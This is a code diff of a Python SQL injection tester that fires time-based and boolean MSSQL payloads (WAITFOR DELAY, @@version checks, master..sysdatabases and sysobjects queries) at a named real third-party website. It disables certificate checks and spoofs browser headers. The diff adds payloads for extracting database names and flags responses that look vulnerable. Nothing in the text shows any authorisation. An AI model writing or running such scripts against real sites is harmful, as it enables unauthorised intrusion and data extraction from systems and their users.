@@ -10,17 +10,23 @@ import requests
 import time
 import urllib.parse
 import sys
-from urllib3.packages.urllib3.exceptions import InsecureRequestWarning
+import json
+import warnings
 
 # Disable SSL warnings
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+warnings.filterwarnings('ignore', message='Unverified HTTPS request')
 
 class ManualSQLTester:
     def __init__(self):
         self.base_url = "https://member.panama8888b.com/public/js/v2/app.js"
         self.session = requests.Session()
         self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1'
         })
         self.session.verify = False
         
@@ -45,7 +51,7 @@ class ManualSQLTester:
             print(f"[+] Content Length: {len(response.content)} bytes")
             
             # Check for SQL errors in response
-            error_indicators = ['error', 'sql', 'syntax', 'database', 'mysql', 'mssql', 'oracle']
+            error_indicators = ['error', 'sql', 'syntax', 'database', 'mysql', 'mssql', 'oracle', 'exception']
             content_lower = response.text.lower()
             
             for indicator in error_indicators:
@@ -69,11 +75,12 @@ class ManualSQLTester:
         print("="*60)
         
         # Test baseline
+        print("\n[*] Running baseline test...")
         baseline_time, _, _ = self.test_payload("25.1", "Baseline - Normal Request")
         
         # Test payloads that worked in curl
         payloads = [
-            # Time-based payloads
+            # Time-based payloads (MSSQL)
             ("25.1)) WAITFOR DELAY '0:0:5' --", "Time-based - WAITFOR DELAY 5 sec"),
             ("25.1)) WAITFOR DELAY '0:0:3' --", "Time-based - WAITFOR DELAY 3 sec"),
             ("25.1)) WAITFOR DELAY '0:0:1' --", "Time-based - WAITFOR DELAY 1 sec"),
@@ -96,6 +103,11 @@ class ManualSQLTester:
             # Advanced payloads
             ("25.1)) AND (SELECT SUBSTRING(@@version,1,1))='M' --", "Boolean - Version check (Microsoft)"),
             ("25.1)) AND LEN(DB_NAME())>3 --", "Boolean - Database name length"),
+            
+            # Additional MSSQL specific payloads
+            ("25.1)) AND (SELECT COUNT(*) FROM master..sysdatabases)>0 --", "Boolean - Master database check"),
+            ("25.1)) AND (SELECT TOP 1 name FROM master..sysdatabases) IS NOT NULL --", "Boolean - Database name extraction"),
+            ("25.1)) AND (SELECT COUNT(*) FROM sysobjects)>0 --", "Boolean - sysobjects count"),
         ]
         
         results = []
@@ -105,14 +117,19 @@ class ManualSQLTester:
             
             # Analyze results
             is_vulnerable = False
+            vulnerability_type = ""
+            
             if "WAITFOR DELAY" in payload and response_time > (baseline_time + 2):
                 is_vulnerable = True
+                vulnerability_type = "Time-based"
                 print(f"[!] VULNERABLE - Time delay detected!")
             elif status_code != 200 and status_code != 0:
                 is_vulnerable = True
+                vulnerability_type = "Status code anomaly"
                 print(f"[!] POTENTIAL VULNERABILITY - Unusual status code")
-            elif any(error in content.lower() for error in ['error', 'sql', 'syntax']):
+            elif any(error in content.lower() for error in ['error', 'sql', 'syntax', 'exception']):
                 is_vulnerable = True
+                vulnerability_type = "Error-based"
                 print(f"[!] POTENTIAL VULNERABILITY - SQL error detected")
             
             results.append({
@@ -120,7 +137,9 @@ class ManualSQLTester:
                 'description': description,
                 'response_time': response_time,
                 'status_code': status_code,
-                'vulnerable': is_vulnerable
+                'vulnerable': is_vulnerable,
+                'vulnerability_type': vulnerability_type,
+                'content_preview': content
             })
             
             time.sleep(1)  # Rate limiting
@@ -139,19 +158,33 @@ class ManualSQLTester:
             for result in results:
                 if result['vulnerable']:
                     print(f"  - {result['description']}")
+                    print(f"    Type: {result['vulnerability_type']}")
                     print(f"    Payload: {result['payload']}")
                     print(f"    Response time: {result['response_time']:.3f}s")
+                    print(f"    Status code: {result['status_code']}")
                     print()
+        else:
+            print("\n[+] No obvious vulnerabilities detected in this test.")
+            print("[+] Consider running with different payloads or techniques.")
         
         return results
 
 if __name__ == "__main__":
-    tester = ManualSQLTester()
-    results = tester.run_tests()
-    
-    # Save results to file
-    import json
-    with open('/workspace/manual_sql_test_results.json', 'w') as f:
-        json.dump(results, f, indent=2)
-    
-    print(f"\n[+] Results saved to: /workspace/manual_sql_test_results.json")
+    try:
+        tester = ManualSQLTester()
+        results = tester.run_tests()
+        
+        # Save results to file
+        output_file = 'manual_sql_test_results.json'
+        with open(output_file, 'w') as f:
+            json.dump(results, f, indent=2)
+        
+        print(f"\n[+] Results saved to: {output_file}")
+        print("[+] Test completed successfully!")
+        
+    except KeyboardInterrupt:
+        print("\n[!] Test interrupted by user")
+        sys.exit(1)
+    except Exception as e:
+        print(f"\n[!] Unexpected error: {e}")
+        sys.exit(1)
